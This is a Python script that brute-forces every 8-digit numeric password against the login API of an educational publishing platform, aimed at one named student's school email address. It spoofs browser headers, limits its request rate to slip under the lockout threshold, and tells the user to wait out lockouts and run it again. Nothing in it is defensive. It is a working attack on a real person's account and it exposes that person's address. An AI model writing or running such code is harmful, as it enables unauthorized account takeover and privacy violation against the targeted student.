import asyncio
import aiohttp
from itertools import product
from tqdm import tqdm
import os
import time

USERNAME = "torres.a6@stu.janesville.k12.wi.us"
URL = "https://my-api.mheducation.com/api/login"
TOTAL = 100_000_000
FOUND = False
LOCKED = False

async def try_pin(sem, session, pin, pbar):
    global FOUND, LOCKED
    if FOUND or LOCKED: return

    async with sem:
        try:
            async with session.post(URL, json={"username": USERNAME, "password": pin}) as r:
                if r.status == 200:
                    print(f"\n\n{'='*60}\n🎯 PASSWORD FOUND: {pin} 🎯\n{'='*60}")
                    FOUND = True
                    pbar.close()
                    os._exit(0)

                if r.status == 403:
                    data = await r.json()
                    if data.get("errorCode") == "ERRORCODE20":
                        LOCKED = True
                        print(f"\n\n🔒 ACCOUNT LOCKED (ERRORCODE20)\nWait 60 minutes then rerun script\nUniqueID: {data.get('errorUniqueId')}")
                        pbar.close()
                        os._exit(0)

        except: pass
        finally:
            pbar.update(1)

async def main():
    global LOCKED
    sem = asyncio.Semaphore(150)  # max speed without instant lock
    connector = aiohttp.TCPConnector(limit=400)
    timeout = aiohttp.ClientTimeout(total=10)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://login.mheducation.com",
        "Referer": "https://login.mheducation.com/"
    }

    async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
        pbar = tqdm(total=TOTAL, desc="SAFE NUCLEAR", unit="pin", colour="cyan")
        tasks = []

        for combo in product("0123456789", repeat=8):
            if FOUND or LOCKED: break
            pin = "".join(combo)
            tasks.append(asyncio.create_task(try_pin(sem, session, pin, pbar)))

            if len(tasks) >= 10000:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                await asyncio.sleep(0)

        if tasks:
            await asyncio.gather(*tasks)
        pbar.close()

print("🚀 PYTHON SAFE-NUCLEAR ACTIVATED — Lock protection ON 🚀")
print("If locked → wait 60 min → rerun same script")
asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
asyncio.run(main())
